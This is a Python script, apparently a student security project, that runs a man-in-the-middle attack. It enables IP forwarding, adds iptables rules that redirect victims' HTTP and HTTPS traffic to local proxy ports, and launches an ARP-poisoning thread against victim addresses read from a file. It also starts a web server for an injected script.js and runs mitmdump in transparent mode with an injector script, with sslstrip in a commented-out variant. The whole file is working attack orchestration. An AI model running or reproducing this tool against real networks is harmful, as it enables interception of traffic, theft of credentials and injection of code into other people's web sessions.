#! /usr/bin/python3

import os, sys, argparse
import threading
from httpServer import webserver
from ArpSpoof import arp_poison_attack
from mitmproxy.tools.main import mitmdump

def main():

	parser = argparse.ArgumentParser(description='ESGI final projet')
	parser.add_argument('-i', '--interface',help='Interface used for MITM ')
	parser.add_argument('-f', '--file', help='Path to file contain victime address one pair line')
	args = parser.parse_args()

	# configure routing (IPTABLES)
	os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
	os.system("iptables -t nat -A POSTROUTING -o"+args.interface+" -j MASQUERADE")
	os.system("iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 8080")
	os.system("iptables -t nat -A PREROUTING -p tcp --destination-port 443 -j REDIRECT --to-port 9090")
	os.system("ip6tables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 8080")
	os.system("ip6tables -t nat -A PREROUTING -p tcp --destination-port 443 -j REDIRECT --to-port 9090")

	#Starting ARP Attack
	#arp_poison_attack(args.interface, args.file)
	poison_thread = threading.Thread(target=arp_poison_attack, args=(args.interface, args.file))
	print("Lancement du thread arp_poison_attack")
	poison_thread.start()

	webserver_thread = threading.Thread(target=webserver)
	print("Lancement du thread webserver")
	webserver_thread.start()


	# start the http server for serving the script.js, in a new console
	#os.system("xterm -hold -e 'python3 httpServer.py' &")

	input("Pause, presse enter")
	# start the mitmproxy


	mitmdump(['-s', 'injector.py', '--showhost', '--mode', 'transparent', '--showhost'])
	#mitmdump(['-s', 'sslstrip.py', '-s', 'injector.py', '--showhost', '--mode', 'transparent', '--showhost', '--cert', '*=certs/cert.pem'])
	webserver_thread.join()
	poison_thread.join()
	webserver_thread._stop()
	poison_thread._stop()


if __name__ == '__main__':
	main()
